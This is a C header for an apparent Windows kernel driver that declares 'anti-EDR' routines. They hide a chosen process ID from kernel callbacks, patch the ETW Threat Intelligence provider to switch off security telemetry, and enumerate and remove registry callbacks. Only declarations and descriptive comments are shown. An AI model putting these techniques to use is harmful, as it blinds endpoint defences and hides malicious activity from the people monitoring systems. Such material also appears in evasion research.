#pragma once

#include <ntifs.h>
#include "../Shared/ioctl.h"

/*
 * Anti-EDR / telemetry suppression routines.
 *
 * KmRedirectNotifyCallbacks:  Swaps Ps callback function pointers to a filter that
 *                             selectively hides a specific PID from callback consumers.
 * KmSuppressEtwTi:           Patches the ETW Threat Intelligence provider registration
 *                             to disable telemetry generation (data-only, HVCI-safe).
 * KmRestoreEtwTi:            Restores the original ETW TI provider state.
 * KmEnumerateRegistryCallbacks: Enumerates CmRegisterCallbackEx registrations.
 * KmRemoveRegistryCallback:  Removes a registry callback via CmUnRegisterCallback.
 */

NTSTATUS KmRedirectNotifyCallbacks(
	IN  HANDLE  HiddenPid,
	OUT PULONG64 PreviousState
);

NTSTATUS KmRestoreNotifyCallbacks( VOID );

NTSTATUS KmSuppressEtwTi(
	OUT PULONG64 PreviousValue
);

NTSTATUS KmRestoreEtwTi( VOID );

NTSTATUS KmEnumerateRegistryCallbacks(
	OUT PCALLBACK_ENTRY Entries,
	IN  ULONG           MaxEntries,
	OUT PULONG          ReturnedEntries
);

NTSTATUS KmRemoveRegistryCallback(
	IN ULONG Index
);
